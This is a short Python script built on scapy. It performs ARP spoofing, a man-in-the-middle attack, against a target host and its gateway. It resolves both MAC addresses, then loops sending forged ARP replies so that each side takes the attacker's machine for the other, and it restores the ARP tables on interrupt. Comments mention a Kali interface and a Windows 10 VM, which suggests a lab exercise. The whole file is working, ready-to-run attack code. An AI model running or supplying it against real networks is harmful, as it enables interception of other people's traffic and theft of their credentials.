from scapy.all import *
import time
import os
import sys

# Replace with your actual IPs and MACs
target_ip = "10.15.4.29"       # IP of Windows 10 VM
gateway_ip = "10.15.0.1"       # Gateway IP (your router)
interface = "eth0"            # Interface on Kali (e.g., eth0, wlan0)

def get_mac(ip):
    answered, _ = sr(ARP(pdst=ip), timeout=2, retry=3, verbose=0)
    for sent, received in answered:
        return received.hwsrc
    return None

def spoof(target_ip, target_mac, spoof_ip):
    # Send spoofed ARP response
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(packet, count=4, verbose=0)

try:
    print("[*] Resolving MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("[!] Could not resolve MAC addresses. Exiting.")
        sys.exit(0)

    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")
    print("[*] Starting ARP spoofing... Press CTRL+C to stop.")

    while True:
        spoof(target_ip, target_mac, gateway_ip)   # Target thinks you are the router
        spoof(gateway_ip, gateway_mac, target_ip)  # Router thinks you are the target
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Restoring ARP tables...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP tables restored. Exiting.")

